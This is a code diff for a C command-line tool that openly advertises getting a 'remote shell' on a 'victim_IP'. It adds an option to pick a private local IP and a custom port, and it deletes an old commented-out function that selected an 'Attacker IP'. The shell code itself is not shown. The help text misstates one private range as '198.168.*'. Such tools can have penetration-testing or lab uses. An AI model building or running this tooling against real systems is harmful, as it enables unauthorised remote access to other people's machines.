@@ -17,12 +17,14 @@ void print_welcome_message(){
 }
 
 void print_help_dialog(const char* arg){
-    printf("\nUsage: %s OPTION victim_IP\n\n", arg);
+    printf("\nUsage: %s OPTION [victim_IP] [local_Port]\n\n", arg);
     printf("Program OPTIONs\n");
     char* line = "-S";
-    char* desc = "Get a remote shell to victim_IP";
+    char* desc = "Get a remote shell to [victim_IP] from first local ip available";
     printf("\t%-40s %-50s\n\n", line, desc);
-
+    line = "-u";
+    desc = "Get a remote shell to [victim_IP] from local private IP(198.168.* or 10.* or 172.*) with custom [local_Port]";
+    printf("\t%-40s %-50s\n\n", line, desc);
 }
 
 void check_ip_address_format(char* address){
@@ -34,7 +36,7 @@ void check_ip_address_format(char* address){
         printf("["KYLW"WARN"RESET"]""The victim IP is probably not valid\n");
     }
 }
-#include <ifaddrs.h>
+
 char* getLocalIpAddress(){
     char hostbuffer[256];
     char* IPbuffer = calloc(256, sizeof(char));
@@ -89,47 +91,6 @@ char* getLocalIpAddress2() {
     freeifaddrs(addrs);
     return IPbuffer;
 }
-// char* getLocalIpAddress2(){
-//     char hostbuffer[256];
-//     char* IPbuffer = calloc(256, sizeof(char));
-//     struct hostent *host_entry;
-//     int hostname;
-  
-//     hostname = gethostname(hostbuffer, sizeof(hostbuffer));
-//     if(hostname==-1){
-//         perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostname");
-//         exit(1);
-//     }
-  
-//     host_entry = gethostbyname(hostbuffer);
-//     if(host_entry == NULL){
-//         perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostbyname");
-//         exit(1);
-//     }
-  
-//     // test interate into addr_list
-
-//     int i = 0;
-//     while (i < host_entry->h_length / sizeof(struct in_addr)) {
-//         struct in_addr addr;
-//         memcpy(&addr, host_entry->h_addr_list[i], sizeof(struct in_addr));
-//         char* currentIP = inet_ntoa(addr);
-//         printf("[" KBLU "INFO" RESET "]""Potential IP: %s\n", currentIP);
-//         // Check if the IP falls within the private IP ranges
-//         if ((strncmp(currentIP, "10.", 3) == 0) ||
-//             (strncmp(currentIP, "172.", 4) == 0 && (atoi(currentIP + 4) >= 16 && atoi(currentIP + 4) <= 31)) ||
-//             (strncmp(currentIP, "192.168.", 8) == 0)) {
-//             printf("[" KBLU "INFO" RESET "]""Attacker IP selected: %s\n", IPbuffer);
-//             return IPbuffer;
-//         }
-//         i++;
-//     }
-
-
-//     // If no valid IP is found, print a warning and return NULL
-//     printf("[" KRED "WARNING" RESET "]""No valid private IP found.\n");
-//     return NULL;
-// }
 
 void get_shell(char* argv){
     char* local_ip = getLocalIpAddress();
